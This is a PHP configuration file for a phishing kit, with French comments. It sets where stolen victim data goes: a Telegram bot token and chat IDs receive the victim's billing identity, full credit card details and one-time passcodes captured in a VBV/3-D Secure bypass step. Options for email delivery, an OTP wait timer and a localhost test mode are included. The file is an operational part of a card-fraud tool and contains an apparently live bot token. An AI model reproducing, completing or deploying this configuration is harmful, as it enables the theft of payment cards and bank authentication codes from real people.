<?php

# Mail
$mail_send = false;                                           # False pour ne pas recevoir par Mail
$my_mail = "";

#Telegram
$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
$bot_token = "8221778819:AAEePkYzk6yqodfYUErFML7T0JD91sNHtDo";
$rez_billing = "-1003795040117";                               # recevoir les premiere info de la personne (nom prenom adresse.....)
$rez_card = "-1003795040117";                                  # recevoir la cc full
$rez_vbv = "-1003795040117";                                 # reception otp

$vbv = true;                                      # Active ou désactive l'otp
$timerVBV = "5";                                  # temps d'attente avant l'otp

# Test mode
$test_mode = true;                                  # active pour tester en localhost (laisser sur false si heberger)

?>
